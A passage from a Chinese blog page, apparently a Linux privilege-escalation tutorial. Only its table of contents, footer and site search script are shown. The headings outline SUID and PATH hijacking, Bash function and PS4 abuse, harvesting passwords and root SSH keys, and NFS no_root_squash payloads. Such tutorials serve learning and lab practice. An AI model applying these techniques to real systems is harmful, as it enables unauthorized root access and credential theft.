          4.创建libcalc.c具有 以下 内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E8%BF%9B%E8%A1%8C%E7%BC%96%E8%AF%91"><span class="toc-number">9.6.2.5.</span> <span class="toc-text">
          5.进行编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E8%BF%90%E8%A1%8C%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%9A%84SUID%E4%BB%A5%E8%8E%B7%E5%BE%97%E6%A0%B9%E5%A3%B3%EF%BC%9A"><span class="toc-number">9.6.2.6.</span> <span class="toc-text">
          6.运行可执行的SUID以获得根壳：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-1"><span class="toc-number">9.7.</span> <span class="toc-text">
          路径环境变量</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-14"><span class="toc-number">9.7.1.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84%E7%A8%8B%E5%BA%8F"><span class="toc-number">9.7.2.</span> <span class="toc-text">
          查找易受攻击的程序</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E6%96%87%E4%BB%B6%E8%BF%90%E8%A1%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%9A"><span class="toc-number">9.7.2.1.</span> <span class="toc-text">
          对文件运行字符串：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%92%88%E5%AF%B9%E5%91%BD%E4%BB%A4%E8%BF%90%E8%A1%8C%E7%AD%96%E7%95%A5%EF%BC%9A"><span class="toc-number">9.7.2.2.</span> <span class="toc-text">
          针对命令运行策略：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E5%91%BD%E4%BB%A4%E8%BF%90%E8%A1%8C-%E8%B7%9F%E8%B8%AA-%EF%BC%9A"><span class="toc-number">9.7.2.3.</span> <span class="toc-text">
          对命令运行 跟踪 ：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-13"><span class="toc-number">9.7.3.</span> <span class="toc-text">
          实操</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%9C%A8%E7%9B%AE%E6%A0%87%E4%B8%8A%E6%9F%A5%E6%89%BESUID-SGID%E6%96%87%E4%BB%B6-%EF%BC%9A-1"><span class="toc-number">9.7.3.1.</span> <span class="toc-text">
          1.在目标上查找SUID&#x2F;SGID文件 ：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%9C%A8SUID%E6%96%87%E4%BB%B6%E4%B8%8A%E8%BF%90%E8%A1%8Cstings%EF%BC%9A"><span class="toc-number">9.7.3.1.1.</span> <span class="toc-text">
          2.在SUID文件上运行stings：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E7%94%A8%E7%AD%96%E7%95%A5%E6%9D%A5%E9%AA%8C%E8%AF%81%E8%BF%99%E4%B8%80%E7%82%B9%EF%BC%9A"><span class="toc-number">9.7.3.2.</span> <span class="toc-text">
          3.我们可以用策略来验证这一点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%88%9B%E5%BB%BA-service-c%E5%85%B7%E6%9C%89-%E4%BB%A5%E4%B8%8B-%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-number">9.7.3.3.</span> <span class="toc-text">
          4.创建 service.c具有 以下 内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E7%BC%96%E8%AF%91service-c%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">9.7.3.4.</span> <span class="toc-text">
          5.编译service.c文件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E5%B0%86%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%EF%BC%88%E6%88%96%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%B0%E6%9C%8D%E5%8A%A1%E7%9A%84%E4%BD%8D%E7%BD%AE%EF%BC%89%E9%A2%84%E7%BC%96%E5%88%B0PATH-%E5%8F%98%E9%87%8F%EF%BC%8C%E5%B9%B6%E6%89%A7%E8%A1%8C%E7%94%A8%E4%BA%8E%E6%A0%B9%E5%A3%B3%E7%9A%84-SUID-%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">9.7.3.5.</span> <span class="toc-text">
          6.将当前目录（或可执行新服务的位置）预编到PATH 变量，并执行用于根壳的 SUID 文件：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8%E5%A4%96%E5%A3%B3%E5%8A%9F%E8%83%BD"><span class="toc-number">9.8.</span> <span class="toc-text">
          滥用外壳功能</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-15"><span class="toc-number">9.8.1.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-14"><span class="toc-number">9.8.2.</span> <span class="toc-text">
          实操</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%9C%A8%E7%9B%AE%E6%A0%87%E4%B8%8A%E6%9F%A5%E6%89%BESUID-SGID-%E6%96%87%E4%BB%B6-%EF%BC%9A-1"><span class="toc-number">9.8.2.1.</span> <span class="toc-text">
          1.在目标上查找SUID&#x2F;SGID  文件 ：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%9C%A8SUID%E6%96%87%E4%BB%B6%E4%B8%8A%E8%BF%90%E8%A1%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%9A"><span class="toc-number">9.8.2.2.</span> <span class="toc-text">
          2.在SUID文件上运行字符串：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E7%94%A8strace-%E7%AD%96%E7%95%A5-%E6%9D%A5%E9%AA%8C%E8%AF%81%E8%BF%99%E4%B8%80%E7%82%B9%EF%BC%9A"><span class="toc-number">9.8.2.3.</span> <span class="toc-text">
          3.我们可以用strace(策略)来验证这一点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%8F%AF%E9%80%89%E5%9C%B0%EF%BC%8C%E6%88%91%E4%BB%AC%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%94%A8%E8%B7%9F%E8%B8%AA%E9%AA%8C%E8%AF%81%EF%BC%9A"><span class="toc-number">9.8.2.4.</span> <span class="toc-text">
          4.可选地，我们也可以用跟踪验证：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E9%AA%8C%E8%AF%81-Bash-%E7%89%88%E6%9C%AC%E4%BD%8E%E4%BA%8E-4-2-048%EF%BC%9A"><span class="toc-number">9.8.2.5.</span> <span class="toc-text">
          5.验证    Bash 版本低于 4.2-048：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E5%88%9B%E5%BB%BA-%E5%85%B7%E6%9C%89%E2%80%9D-usr-sbin-service%E2%80%9D%E5%90%8D%E7%A7%B0%E7%9A%84-Bash-%E5%8A%9F%E8%83%BD-%E5%B9%B6%E5%AF%BC%E5%87%BA-%E8%AF%A5%E5%8A%9F%E8%83%BD%EF%BC%9A"><span class="toc-number">9.8.2.6.</span> <span class="toc-text">
          6.创建 具有”&#x2F;usr&#x2F;sbin&#x2F;service”名称的 Bash 功能 并导出 该功能：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E6%89%A7%E8%A1%8C%E7%94%A8%E4%BA%8E%E6%A0%B9%E5%A3%B3%E7%9A%84-SUID-%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">9.8.2.7.</span> <span class="toc-text">
          7.执行用于根壳的 SUID 文件：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BB%A5%E7%94%A8%E5%A4%96%E5%A3%B3%E5%8A%9F%E8%83%BD"><span class="toc-number">9.9.</span> <span class="toc-text">
          二、滥用外壳功能</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-16"><span class="toc-number">9.9.1.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-15"><span class="toc-number">9.9.2.</span> <span class="toc-text">
          实操</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%9C%A8%E7%9B%AE%E6%A0%87%E4%B8%8A%E6%9F%A5%E6%89%BE%E8%8B%8F%E4%BC%8A%E5%BE%B7-SGID-%E6%96%87%E4%BB%B6-%EF%BC%9A"><span class="toc-number">9.9.2.1.</span> <span class="toc-text">
          1.在目标上查找苏伊德&#x2F;SGID 文件 ：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%9C%A8SUID%E6%96%87%E4%BB%B6%E4%B8%8A%E8%BF%90%E8%A1%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%9A-1"><span class="toc-number">9.9.2.2.</span> <span class="toc-text">
          2.在SUID文件上运行字符串：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E7%94%A8%E7%AD%96%E7%95%A5%E6%9D%A5%E9%AA%8C%E8%AF%81%E8%BF%99%E4%B8%80%E7%82%B9%EF%BC%9A-1"><span class="toc-number">9.9.2.3.</span> <span class="toc-text">
          3.我们可以用策略来验证这一点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%8F%AF%E9%80%89%E5%9C%B0%EF%BC%8C%E4%BB%AC%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%94%A8Itrace%E9%AA%8C%E8%AF%81%EF%BC%9A"><span class="toc-number">9.9.2.4.</span> <span class="toc-text">
          4.可选地，们也可以用Itrace验证：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E8%BF%90%E8%A1%8C%E6%94%AF%E6%8C%81bash%E8%B0%83%E8%AF%95%E7%9A%84SUID%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B9%B6%E5%88%86%E9%85%8D%E7%BB%99%E6%88%91%E4%BB%AC%E7%9A%84%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7%E7%9A%84PS4%E5%8F%98%E9%87%8F%EF%BC%9A"><span class="toc-number">9.9.2.5.</span> <span class="toc-text">
          5.运行支持bash调试的SUID文件，并分配给我们的有效载荷的PS4变量：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E4%BD%BF%E7%94%A8-p-%E5%91%BD%E4%BB%A4%E8%A1%8C%E9%80%89%E9%A1%B9%E8%BF%90%E8%A1%8C-tmp-rootbash%E6%96%87%E4%BB%B6%E4%BB%A5%E8%8E%B7%E5%8F%96root%EF%BC%9A"><span class="toc-number">9.9.2.6.</span> <span class="toc-text">
          6.使用 -p 命令行选项运行 &#x2F;tmp&#x2F;rootbash文件以获取root：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x10-%E5%AF%86%E7%A0%81-amp-%E9%92%A5%E5%8C%99"><span class="toc-number">10.</span> <span class="toc-text">
          0x10 密码 &amp;钥匙</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-17"><span class="toc-number">10.1.</span> <span class="toc-text">
          前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81"><span class="toc-number">10.1.1.</span> <span class="toc-text">
          密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E6%96%87%E4%BB%B6"><span class="toc-number">10.1.2.</span> <span class="toc-text">
          历史文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-16"><span class="toc-number">10.2.</span> <span class="toc-text">
          实操</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7-home%E7%9B%AE%E5%BD%95%E4%B8%AD%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%8C%E6%96%87%E4%BB%B6%E5%90%8D%E4%BB%A5%E2%80%9D%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E2%80%9D%E7%BB%93%E5%B0%BE%EF%BC%9A"><span class="toc-number">10.2.1.</span> <span class="toc-text">
          1.查看用户&#x2F;home目录中隐藏文件的内容，文件名以”历史记录”结尾：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-su-%E7%99%BB%E5%BD%95"><span class="toc-number">10.2.2.</span> <span class="toc-text">
          2.su 登录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">10.3.</span> <span class="toc-text">
          配置文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-18"><span class="toc-number">10.3.1.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-17"><span class="toc-number">10.3.2.</span> <span class="toc-text">
          实操</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%97%E5%87%BA%E7%94%A8%E6%88%B7%E5%AE%B6%E5%BA%AD%E7%9B%AE%E5%BD%95%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-number">10.3.2.1.</span> <span class="toc-text">
          1.列出用户家庭目录的内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9F%A5%E7%9C%8Bmyvpn-ovpn-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-number">10.3.2.2.</span> <span class="toc-text">
          2.查看myvpn.ovpn 配置文件的内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-number">10.3.2.3.</span> <span class="toc-text">
          3.查看文件内容：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%BD%BF%E7%94%A8su-%E7%99%BB%E5%BD%95"><span class="toc-number">10.3.2.4.</span> <span class="toc-text">
          4.使用su 登录</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-%E5%AF%86%E9%92%A5"><span class="toc-number">10.4.</span> <span class="toc-text">
          SSH 密钥</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-19"><span class="toc-number">10.4.1.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-18"><span class="toc-number">10.4.2.</span> <span class="toc-text">
          实操</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-root%E7%94%A8%E6%88%B7%E7%9A%84ssh%E5%AF%86%E9%92%A5%E5%AD%98%E5%82%A8%E5%9C%A8-ssh"><span class="toc-number">10.4.2.1.</span> <span class="toc-text">
          1.root用户的ssh密钥存储在.ssh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9F%A5%E7%9C%8Broot-key%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-number">10.4.2.2.</span> <span class="toc-text">
          2.查看root_key文件的内容：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%B0%86root-key%E6%96%87%E4%BB%B6%E5%A4%8D%E5%88%B6%E5%88%B0kali%E5%B9%B6%E5%8A%A0%E6%9D%83%E4%BB%A5%E4%BE%BF-SSH-%E6%8E%A5%E5%8F%97%E5%AE%83%EF%BC%9A"><span class="toc-number">10.4.3.</span> <span class="toc-text">
          3.将root_key文件复制到kali并加权以便 SSH 接受它：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%BD%BF%E7%94%A8%E5%AF%86%E9%92%A5%E8%BF%9B%E8%A1%8C%E8%BF%9E%E6%8E%A5%E5%88%B0-SSH-%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">10.4.3.1.</span> <span class="toc-text">
          4.使用密钥进行连接到 SSH 服务器</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x11-NFS"><span class="toc-number">11.</span> <span class="toc-text">
          0x11 NFS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-20"><span class="toc-number">11.1.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%BE%E7%A4%BA-NFS-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%AF%BC%E5%87%BA%E5%88%97%E8%A1%A8%EF%BC%9A"><span class="toc-number">11.2.</span> <span class="toc-text">
          显示 NFS 服务器的导出列表：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E4%BC%BC%E7%9A%84nmap%E8%84%9A%E6%9C%AC%EF%BC%9A"><span class="toc-number">11.3.</span> <span class="toc-text">
          类似的nmap脚本：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-NFS-%E5%85%B1%E4%BA%AB%EF%BC%9A"><span class="toc-number">11.4.</span> <span class="toc-text">
          安装 NFS 共享：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Squashing"><span class="toc-number">11.5.</span> <span class="toc-text">
          Root Squashing</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#no-root-squash"><span class="toc-number">11.6.</span> <span class="toc-text">
          no_root_squash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-19"><span class="toc-number">11.7.</span> <span class="toc-text">
          实操</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%A3%80%E6%9F%A5-etc-exports-%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%8C%E4%BA%86%E8%A7%A3%E5%85%B7%E6%9C%89no-root-squash%E9%80%89%E9%A1%B9%E7%9A%84%E9%85%8D%E7%BD%AE%EF%BC%9A"><span class="toc-number">11.7.1.</span> <span class="toc-text">
          1.检查 &#x2F;etc&#x2F;exports 的内容，了解具有no_root_squash选项的配置：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%A1%AE%E8%AE%A4NFS-%E5%85%B1%E4%BA%AB%E5%8F%AF%E7%94%A8%E4%BA%8E%E8%BF%9C%E7%A8%8B%E5%AE%89%E8%A3%85%EF%BC%9A"><span class="toc-number">11.7.2.</span> <span class="toc-text">
          2.确认NFS 共享可用于远程安装：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%9C%A8kali%E4%B8%8A%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E5%A4%B9%EF%BC%8C%E5%B9%B6%E5%AE%89%E8%A3%85-tmp-NFS%E5%85%B1%E4%BA%AB%EF%BC%9A"><span class="toc-number">11.7.3.</span> <span class="toc-text">
          3.在kali上创建一个文件夹，并安装&#x2F;tmp  NFS共享：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%BD%BF%E7%94%A8kali%E4%B8%8A%E7%9A%84root%E7%94%A8%E6%88%B7%E7%94%9F%E6%88%90%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7%E5%B9%B6%E5%B0%86%E5%85%B6%E4%BF%9D%E5%AD%98%E5%88%B0%E5%AE%89%E8%A3%85%E7%9A%84%E5%85%B1%E4%BA%AB%E4%B8%AD%EF%BC%9A"><span class="toc-number">11.7.4.</span> <span class="toc-text">
          4.使用kali上的root用户生成有效载荷并将其保存到安装的共享中：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E7%A1%AE%E4%BF%9D%E6%96%87%E4%BB%B6%E5%85%B7%E6%9C%89-SUID-%E4%BD%8D%E9%9B%86%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%AF%8F%E4%B8%AA%E7%94%A8%E6%88%B7%E9%83%BD%E5%8F%AF%E6%89%A7%E8%A1%8C%EF%BC%9A"><span class="toc-number">11.7.5.</span> <span class="toc-text">
          5.确保文件具有 SUID 位集，并且每个用户都可执行：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%9C%A8%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8A%EF%BC%8C%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E4%BB%A5%E8%8E%B7%E5%8F%96root%EF%BC%9A"><span class="toc-number">11.7.6.</span> <span class="toc-text">
          6.在目标机器上，执行文件以获取root：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%80%BB%E7%BB%93"><span class="toc-number">11.8.</span> <span class="toc-text">
          权限提升总结</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://gitee.com/BothSavage/PicGo/raw/master/image/头像.png" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">15</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">2</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">15</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>John Doe</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.4.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
